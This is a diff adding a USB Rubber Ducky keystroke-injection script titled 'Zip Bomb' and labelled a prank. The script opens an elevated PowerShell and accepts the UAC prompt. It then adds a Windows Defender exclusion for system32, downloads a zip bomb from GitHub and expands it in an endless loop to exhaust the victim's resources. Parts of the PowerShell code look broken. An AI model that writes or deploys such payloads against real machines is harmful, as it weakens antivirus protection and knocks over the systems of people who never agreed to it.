@@ -1,0 +1,21 @@
+REM Title: Zip Bomb
+REM Author: FalsePhilosopher
+REM Target:  Win, alt for possible 10/11 launch untested
+REM Props: Hak5, friends and memes
+REM Version: 1.0
+REM Category: Prank
+REM Launches zip bomb and opens it in parallel on however many cores the cpu has.
+REM
+REM startup delay
+DELAY 300
+GUI r
+DELAY 500
+STRING powershell
+CTRL-SHIFT ENTER
+DELAY 1500
+SHIFT TAB
+DELAY 500
+ENTER
+DELAY 2000
+STRING powershell -w h Add-MpPreference -ExclusionPath C:\Windows\system32;;curl https://github.com/FalsePhilosopher/BadUSB-Playground/raw/main/Ducky/USBRubberducky/library/prank/Unix-like/Linux/Bombs/zip_bomb/42.zip -OutFile 42.zip;;while (1) { $NumberOfLogicalProcessor = (Get-WmiObject Win32_Processor).NumberOfLogicalProcessors;;[runspacefactory]::CreateRunspacePool(1,$NumberOfLogicalProcessors);;$RunspacePool.Open();;$PSinstance = [powershell]::(Expand-Archive -Path 42.zip -Force);;$PSinstance.RunspacePool = $RunspacePool;;$PSinstance.BeginInvoke(); }
+ENTER
